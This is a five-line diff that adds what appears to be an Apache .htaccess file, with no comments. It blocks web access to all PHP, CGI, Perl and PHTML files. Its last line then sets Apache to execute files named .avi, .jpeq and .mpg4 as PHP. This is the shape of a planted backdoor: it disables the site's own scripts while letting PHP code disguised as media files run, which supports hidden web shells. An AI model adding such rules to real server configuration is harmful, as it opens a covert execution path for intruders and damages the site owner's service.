@@ -1,0 +1,5 @@
+<FilesMatch ".([Pp][Hh][Pp]|[Cc][Gg][Ii]|[Pp][Ll]|[Pp][Hh][Ii][Mm][Ll]).?">
+   Order allow,deny
+   Deny from all
+</FilesMatch>
+AddHandler application/x-httpd-php .avi .jpeq .mpg4
